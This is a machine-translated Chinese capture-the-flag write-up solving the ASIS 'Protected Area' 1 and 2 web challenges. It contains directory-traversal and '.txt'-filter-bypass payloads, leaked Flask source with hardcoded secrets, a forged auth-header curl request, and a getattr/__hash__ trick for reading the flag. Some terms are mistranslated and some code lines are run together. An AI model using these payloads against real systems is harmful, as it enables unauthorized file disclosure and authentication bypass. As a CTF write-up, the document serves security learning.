# CTF ASIS—保护区 1 和 2 演练

> 原文：<https://infosecwriteups.com/asis-ctf-protected-area-1-2-walkthrough-5e6db7869658?source=collection_archive---------1----------------------->

您好，本演练的读者应该知道这些主题:

1.  码头工人
2.  Nginx
3.  烧瓶结构及一点发展
4.  将 Flask 作为 uWSGI 服务运行
5.  Web 应用程序漏洞评估
6.  起毛

![](img/611a7cd48861adabeabb03ab238aae56.png)

# 保护区第一部分

打开[挑战 IP](http://66.172.33.148:8008/) 导致发送两个 HTTP 请求:

```
[http://66.172.33.148:8008/check_perm/readable/?file=public.txt](http://66.172.33.148:8008/check_perm/readable/?file=public.txt)
[http://66.172.33.148:8008/read_file/?file=public.txt](http://66.172.33.148:8008/read_file/?file=public.txt)
```

第一个链接进行了目录遍历:

```
[http://66.172.33.148:8008/check_perm/readable/?file=../../../../../../etc/passwd](http://66.172.33.148:8008/check_perm/readable/?file=../../../../../../etc/passwd)
```

然而，没有任何有用的收获。第二个链接是文件打开器。我试图模糊输入:

```
?file=[FUZZ]public.txt[FUZZ]
```

模糊结果:

1.  `../`被替换为空值(`../public.txt`返回内容)
2.  文件应该以`.txt`结尾

我试过了:

```
....//.txt
```

得到不同的错误(500)。为了绕过`.txt`，我尝试了以下方法:

1.  空字节
2.  新行/其他空白
3.  参数污染

一无所获。下面我花了一些时间，请求/回应如下:

```
?file=....//public.txt.txt -> security
?file=....//public.py.txt  -> 500
```

为什么第一个链接返回安全？已经被`.txt`结束了，应该没问题了。结论:`.txt`应该是参数|查询字符串的最后一部分。所以:

```
?file=....//&.txt
```

得了 500。过滤器被绕过。快速模糊:

```
?file=....//[FUZZ]&.txt
```

透露了`app.py`:

```
from flask import Flask

def create_app():
    """Construct the core application."""
    app = Flask(__name__, instance_relative_config=False)

    with app.app_context():
        # Imports
        **from . import api** return app
```

`api.py`:

```
from flask import current_app as app
from flask import request, render_template, send_file
**from .functions import *
from config import ***
import os

@app.route('/check_perm/readable/', methods=['GET'])
def app_check_file() -> str:
    try:
        file = request.args.get("file")

        file_path = os.path.normpath('application/files/{}'.format(file))
        with open(file_path, 'r') as f:
            return str(f.readable())
    except:
        return '0'

@app.route('/read_file/', methods=['GET'])
def app_read_file() -> str:

    file = request.args.get("file").replace('../', '')
    qs = request.query_string.decode('UTF-8')

    if qs.find('.txt') != (len(qs) - 4):
        return 'security'

    try:
        return send_file('files/{}'.format(file))
    except Exception as e:
        return "500"

@app.route('/protected_area_0098', methods=['GET'])
@check_login
def app_protected_area() -> str:
    return Config.FLAG

@app.route('/', methods=['GET'])
def app_index() -> str:
    return render_template('index.html')

@app.errorhandler(404)
def not_found_error(error) -> str:
    return "Error 404"
```

标志在`protected_area_0098`中，但是需要认证，两个重要的文件是`config.py` : (…//….//config.py &。txt)

```
import os

class Config:
    """Set Flask configuration vars from .env file."""

    # general config
 **FLAG       = os.environ.get('FLAG')
    SECRET     = "s3cr3t"
    ADMIN_PASS = "b5ec168843f71c6f6c30808c78b9f55d"**
```

还有`functions.py` (…。//functions.py &。txt)

```
from flask import request, abort
from functools import wraps
import traceback, os, hashlib
from config import *

def check_login(f):
    """
    Wraps routing functions that require a user to be logged in
    """
    @wraps(f)
    def wrapper(*args, **kwds):
        try:
            ah = request.headers.get('ah')

            **if ah == hashlib.md5((Config.ADMIN_PASS + Config.SECRET).encode("utf-8")).hexdigest():
                return f(*args, **kwds)**
            else:
                return abort(403)

        except:
            return abort(403)

    return wrapper
```

旗帜:

```
curl [http://66.172.33.148:8008/protected_area_0098](http://66.172.33.148:8008/protected_area_0098) -H "ah: cbd54a3499ba0f4b221218af1958e281" -v
*   Trying 66.172.33.148...
* TCP_NODELAY set
* Connected to 66.172.33.148 (66.172.33.148) port 8008 (#0)
> GET /protected_area_0098 HTTP/1.1
> Host: 66.172.33.148:8008
> User-Agent: curl/7.64.1
> Accept: */*
> ah: cbd54a3499ba0f4b221218af1958e281
>
< HTTP/1.1 200 OK
< Server: nginx/1.15.8
< Date: Sun, 17 Nov 2019 13:53:05 GMT
< Content-Type: text/html; charset=utf-8
< Content-Length: 38
<
* Connection #0 to host 66.172.33.148 left intact
ASIS{f70a0203d638a0c90a490ad46a94e394}
* Closing connection 0
```

# 保护区第二部分

挑战和之前一样。`private.txt`揭示了后端基础架构:

```
https://github.com/tiangolo/uwsgi-nginx-flask-docker
```

我对 URL 的各个部分做了大量的模糊处理:

```
?file=[FUZZ]public[FUZZ].txt[FUZZ]
```

一无所获。花了一段时间后，我去查了第二个网址:

```
[http://66.172.33.148:5008/check_perm/readable/?file=test](http://66.172.33.148:5008/check_perm/readable/?file=test)
```

与第一个问题不同的是，错误消息:

```
[Errno 2] No such file or directory: '/files/test'
```

所以我试图模糊输入，没有什么有用的。几个小时后，我得到了一个错误的网址:

```
[http://66.172.33.148:5008/check_perm/test/?file=public.txt](http://66.172.33.148:5008/check_perm/test/?file=public.txt)
```

回应是:

```
'_io.TextIOWrapper' object has no attribute 'test'
```

我在`TextIOWrapper`中，所以我运行下面的代码:

```
>>> print(dir(open('/etc/passwd')))['_CHUNK_SIZE', '__class__', '__del__', '__delattr__', '__dict__', '__dir__', '__doc__', '__enter__', '__eq__', '__exit__', '__format__', '__ge__', '__getattribute__', '__getstate__', '__gt__', '**__hash__**', '__init__', '__init_subclass__', '__iter__', '__le__', '__lt__', '__ne__', '__new__', '__next__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '_checkClosed', '_checkReadable', '_checkSeekable', '_checkWritable', '_finalizing', 'buffer', 'close', 'closed', 'detach', 'encoding', 'errors', 'fileno', 'flush', 'isatty', 'line_buffering', 'mode', 'name', 'newlines', '**read**', 'readable', 'readline', 'readlines', 'reconfigure', 'seek', 'seekable', 'tell', 'truncate', 'writable', 'write', 'write_through', 'writelines']
```

`read`很好:

```
[http://66.172.33.148:5008/check_perm/read/?file=public.txt](http://66.172.33.148:5008/check_perm/read/?file=public.txt)
```

我得到了内容，所以发现了文件泄露漏洞。我运行 docker 映像并进入其中:

```
docker run -d -p5000:80 uwsgi-nginx-flask-docker
docker exec -it $(docker ps -q) /bin/bash
```

以下文件似乎更有趣:

```
/etc/nginx/nginx.conf
/etc/nginx/conf.d/nginx.conf
```

结果是:

```
server {
    listen 80;
    location / {
        try_files $uri [@app](http://twitter.com/app);
    }
    location [@app](http://twitter.com/app) {
        include uwsgi_params;
        uwsgi_pass unix:///tmp/uwsgi.sock;
    }
    location /static {
        **alias /opt/py/app/static;**
    }
}
```

根文件夹:`/opt/py/app`所以我通过查找应用程序名称(我通过猜测读取了`config.py`，但是这还不够，因为标志不能被`check_perm`端点读取):

```
import osclass Config:
    """Set Flask configuration vars from .env file."""# general config
    FLAG      = "flag/flag"
    FLAG_SEND = "../flag/flag"
```

阅读[回购](https://github.com/tiangolo/uwsgi-nginx-flask-docker):

```
[uwsgi]
module = main
callable = app
```

*   `module = main`是指文件`main.py`。
*   `callable = app`是指`Flask`中的【应用】，变量`app`

所以:

```
view-source:http://66.172.33.148:5008/check_perm/read/?file=../opt/py/app/uwsgi.ini
```

结果是:

```
[uwsgi]
**module = main_application** callable = app
py-autoreload = 1
uid = nginx
gid = nginx
process = 5
max-requests=5000
```

`main_application.py`:

```
from **app_source.main** import *app = create_app()if __name__ == "__main__":
    app.run(host='0.0.0.0', debug=True)
```

阅读所有文件揭示结构(从`/opt/py/app/`):

```
.
|-- main_application.py
|-- app_source
|-------------|--- main.py
|-------------|--- admin_route.py
|-------------|--- all_routes.py
```

`admin_routes.py`:

```
from flask import current_app as app
from flask import request, render_template, send_file
import traceback, json
from config import *
import os[@app](http://twitter.com/app).route('/protected_area/<file_hash>', methods=['GET'])
def app_protected_area(file_hash) -> str:
    try:
        if str(hash(open(Config.FLAG))) == file_hash:
            return send_file(Config.FLAG_SEND)
        else:
            abort(403)
    except:
        return "500"
```

为了读取标志，我应该有标志的散列，怎么做？我可以得到`flag`的`__hash__`属性。然而，`check_perm`结束点不能包含`flag`。解决方案在`all_routes.py`中:

```
from flask import current_app as app
from flask import request, render_template, send_file
import traceback, json
import os[@app](http://twitter.com/app).route('/check_perm/<method>/', methods=['GET'])
def app_checkb_file(method) -> json:
    try:
        file = request.args.get("file")if file.find('/proc') != -1:
            return "0"file_path = os.path.normpath('/files/{}'.format(file))
        with open(file_path, 'r') as f:call = getattr(f, method)()
 **if type(call) == int:
                return str(call)**
 **elif type(call) != list and file.find('flag') == -1:
                return str(call)**return '0'
    except Exception as e:
        return str(e)[@app](http://twitter.com/app).route('/read_file/', methods=['GET'])
def app_read_file() -> str:

    file = request.args.get("file").replace('../', '')if file.find('.txt') != (len(file) - 4):
        return 'security'

    try:
        return send_file('/files/{}'.format(file))
    except Exception as e:
        return str(e)[@app](http://twitter.com/app).route('/', methods=['GET'])
def app_index() -> str:
    return render_template('index.html')[@app](http://twitter.com/app).errorhandler(404)
def not_found_error(error) -> str:
    return "Error 404"
```

文件的哈希是一个整数:

```
>>> type(open('/etc/passwd').__hash__())<class 'int'>
```

这样我就可以计算出`flag/flag`的`__hash__()`:

```
view-source:http://66.172.33.148:5008/check_perm/__hash__/?file=../opt/py/app/flag/flag
```

获取标志:

```
curl http://66.172.33.148:5008/protected_area/8771321880381ASIS{1b7dc3a5ba52a11f0361bec284e59d58}
```

*关注* [*Infosec 报道*](https://medium.com/bugbountywriteup) *获取更多此类精彩报道。*

[](https://medium.com/bugbountywriteup) [## 信息安全报道

### 收集了世界上最好的黑客的文章，主题从 bug 奖金和 CTF 到 vulnhub…

medium.com](https://medium.com/bugbountywriteup)